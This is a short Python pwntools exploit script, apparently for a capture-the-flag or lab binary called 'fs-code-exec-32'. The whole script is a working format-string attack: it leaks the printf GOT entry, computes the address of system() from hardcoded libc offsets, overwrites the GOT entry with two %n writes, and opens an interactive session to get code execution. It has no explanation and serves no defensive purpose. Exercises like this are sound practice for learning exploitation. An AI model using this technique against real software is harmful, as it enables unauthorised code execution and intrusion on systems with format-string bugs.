#!/usr/bin/env python
from pwn import *
p = process('./fs-code-exec-32')
# arbitrary read -> read the GOT of printf
got_of_printf = p.elf.got['printf']
print(p.recv())
p.sendline(p32(got_of_printf) + "%7$s")
data = p.recv()
print("->" + repr(data))
libc_printf = u32(data[10:14])
print(hex(libc_printf))
libc_system = libc_printf - 0xf7e40670 + 0xf7e31da0
lower_16_system = libc_system & 0xffff
first = lower_16_system - 8
second = (libc_system >> 16) - lower_16_system
while second < 0:
    second += 0x10000
print(hex(libc_system))
print(hex(first))
print(hex(second))
buf = p32(got_of_printf) + p32(got_of_printf + 2)
buf += "%" + "%05d" % first + "x"
buf += "%7$n"
buf += "%" + "%05d" % second + "x"
buf += "%8$n"
print(buf)
p.sendline(buf)
p.interactive()